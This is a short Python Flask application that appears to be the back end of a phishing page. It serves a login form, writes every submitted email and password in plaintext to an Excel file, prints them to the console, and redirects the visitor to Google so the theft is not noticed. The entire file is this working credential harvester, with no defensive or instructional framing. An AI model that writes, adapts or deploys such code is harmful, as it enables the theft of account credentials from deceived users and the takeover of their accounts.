from flask import Flask, request, redirect, render_template
import openpyxl

app = Flask(__name__)

wb = openpyxl.Workbook()
ws = wb.active
ws.title = "LoginData"
ws.append(["Email", "Password"])  

@app.route('/')
def login():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def handle_login():
    email = request.form['email']
    password = request.form['password']
    
    ws.append([email, password])
    wb.save('login_data.xlsx')
    
    print(f"Received email: {email}")
    print(f"Received password: {password}")
    print("Redirecting to Google...")
    
    return redirect("https://www.google.com")

if __name__ == '__main__':
    app.run(debug=True)
